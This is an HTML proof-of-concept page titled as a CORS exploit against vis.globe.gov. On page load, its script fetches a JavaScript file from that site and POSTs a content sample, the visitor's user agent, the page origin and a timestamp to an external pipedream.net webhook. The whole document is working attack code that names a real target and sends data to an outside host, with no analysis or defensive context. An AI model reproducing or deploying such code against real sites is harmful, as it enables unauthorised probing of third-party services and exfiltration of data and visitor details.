<!DOCTYPE html>
<html>
<head>
  <title>üî• Exploiting vis.globe.gov CORS</title>
  <meta charset="UTF-8">
</head>
<body>
  <pre id="status">Loading...</pre>

  <script>
    const victimUrl = 'https://vis.globe.gov/GLOBE/VISmain.js';
    const exfilUrl = 'https://eojzzzf3qvc4t0o.m.pipedream.net';

    async function exploitCORS() {
      try {
        const res = await fetch(victimUrl, {
          method: 'GET',
          mode: 'cors',
          credentials: 'omit' // safe for wildcard origins
        });

        const data = await res.text();
        document.getElementById('status').innerText = '‚úÖ Loaded VISmain.js (status ' + res.status + ')';

        await fetch(exfilUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message: 'CORS Exploit Successful',
            status: res.status,
            length: data.length,
            content_sample: data.slice(0, 500),  // send first 500 chars only
            userAgent: navigator.userAgent,
            origin: location.origin,
            timestamp: new Date().toISOString()
          })
        });

        document.getElementById('status').innerText += '\nüì¨ Webhook POST sent!';
      } catch (err) {
        document.getElementById('status').innerText = '‚ùå Exploit failed: ' + err;
      }
    }

    exploitCORS();
  </script>
</body>
</html>
